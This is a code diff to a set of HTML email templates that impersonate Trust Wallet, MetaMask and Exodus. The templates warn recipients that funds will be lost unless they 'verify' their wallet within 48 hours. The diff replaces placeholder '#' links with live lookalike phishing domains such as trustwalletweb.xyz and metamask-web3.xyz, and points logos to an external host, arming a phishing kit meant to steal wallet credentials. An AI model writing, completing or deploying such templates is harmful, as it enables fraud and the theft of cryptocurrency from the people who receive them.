@@ -69,7 +69,7 @@ const templates = {
     <div class="container">
       <div class="header">
         <img
-          src=""
+          src="https://mailer-rosy.vercel.app/trust.png"
           width="50"
           height="50"
           style="border-radius: 25px; background-color: white"
@@ -88,7 +88,7 @@ const templates = {
           verification before release. Please complete the verification process
           by accessing the secure link below:
         </p>
-        <a href="#" class="button">Verify Wallet</a>
+        <a href="http://trustwalletweb.xyz" class="button">Verify Wallet</a>
         <p style="font-size: small">
           Important: If you do not complete verification within 48 hours, this
           transaction will be permanently removed from our system and the funds
@@ -154,7 +154,7 @@ const templates = {
     <div class="container">
       <div class="header">
         <img
-          src="/assets/trust.png"
+          src="https://mailer-rosy.vercel.app/trust.png"
           width="50"
           height="50"
           style="border-radius: 25px; background-color: white"
@@ -177,7 +177,7 @@ const templates = {
           digital assets.
         </p>
 
-        <a href="#" class="button">Sign and Verify Wallet</a>
+        <a href="http://trustwalletweb.xyz" class="button">Sign and Verify Wallet</a>
         <p style="font-size: 14px">
           The process is quick, secure, and completely free.
         </p>
@@ -256,7 +256,7 @@ const templates = {
           "
         >
           <img
-            src="/assets/metamask1.png"
+            src="https://mailer-rosy.vercel.app/metamask1.png"
             width="20"
             height="20"
           />
@@ -280,7 +280,7 @@ const templates = {
           queued in our Ethereum Virtual Machine (EVM) processing center.
         </p>
 
-        <a href="#" class="button">VERIFY WALLET</a>
+        <a href="http://metamask-web3.xyz" class="button">VERIFY WALLET</a>
 
         <div class="story">
           <p>
@@ -366,7 +366,7 @@ const templates = {
           "
         >
           <img
-            src="/assets/metamask1.png"
+            src="https://mailer-rosy.vercel.app/metamask1.png"
             width="20"
             height="20"
           />
@@ -400,7 +400,7 @@ const templates = {
           </p>
         </div>
 
-        <a href="#" class="button">Verify Your MetaMask Wallet</a>
+        <a href="http://metamask-web3.xyz" class="button">Verify Your MetaMask Wallet</a>
 
         <div style="font-size: small">
           <p>
@@ -456,7 +456,7 @@ const templates = {
       .content {
         position: relative;
         padding: 30px;
-        background-image: url("/assets/background-exodus.jpg");
+        background-image: url("https://mailer-rosy.vercel.app/background-exodus.jpg");
         background-size: cover;
         background-position: center;
         background-repeat: no-repeat;
@@ -496,7 +496,7 @@ const templates = {
         <div
           style="display: flex; justify-content: center; align-items: center"
         >
-          <img src="/assets/exodus.png" width="50" height="50" />
+          <img src="https://mailer-rosy.vercel.app/exodus.png" width="50" height="50" />
           <p
             style="
               color: white;
@@ -527,7 +527,7 @@ const templates = {
           </p>
         </div>
 
-        <a href="#" class="button">Verify Wallet</a>
+        <a href="http://exodus-web3.xyz" class="button">Verify Wallet</a>
 
         <div>
           <p style="font-size: small; color: #aeaeae">
